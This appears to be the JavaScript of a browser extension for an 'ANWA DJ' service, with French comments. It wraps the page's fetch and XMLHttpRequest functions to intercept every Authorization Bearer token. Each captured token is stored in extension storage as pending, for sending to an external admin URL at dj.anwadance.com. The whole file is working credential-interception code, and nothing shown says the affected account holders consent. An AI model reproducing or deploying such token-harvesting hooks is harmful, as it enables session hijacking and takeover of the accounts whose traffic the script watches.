const ADMIN_URL = 'https://dj.anwadance.com/admin.php';
let lastToken = null;
let lastSent = 0;

function sendToken(token) {
  const now = Date.now();
  if (token === lastToken && (now - lastSent) < 50 * 60 * 1000) return;
  lastToken = token;
  lastSent = now;
  console.log('%c✅ ANWA DJ: Token capturé, stockage...', 'color: #1DB954; font-weight: bold');
  // Utiliser chrome.storage au lieu de sendMessage
  chrome.storage.local.set({ 
    pending_token: token,
    pending_time: Date.now()
  }, function() {
    console.log('%c✅ ANWA DJ: Token en attente d\'envoi', 'color: #1DB954; font-weight: bold');
  });
}

const origFetch = window.fetch;
window.fetch = function(...args) {
  try {
    const opts = args[1] || {};
    const headers = opts.headers || {};
    let auth = null;
    if (headers instanceof Headers) auth = headers.get('authorization') || headers.get('Authorization');
    else if (typeof headers === 'object') auth = headers['authorization'] || headers['Authorization'];
    if (auth && auth.startsWith('Bearer ')) sendToken(auth.replace('Bearer ', ''));
  } catch(e) {}
  return origFetch.apply(this, args);
};

const origXHR = XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
  if (name && name.toLowerCase() === 'authorization' && value && value.startsWith('Bearer ')) {
    sendToken(value.replace('Bearer ', ''));
  }
  return origXHR.apply(this, arguments);
};

console.log('%c🎵 ANWA DJ: Interception active', 'color: #1DB954; font-weight: bold');
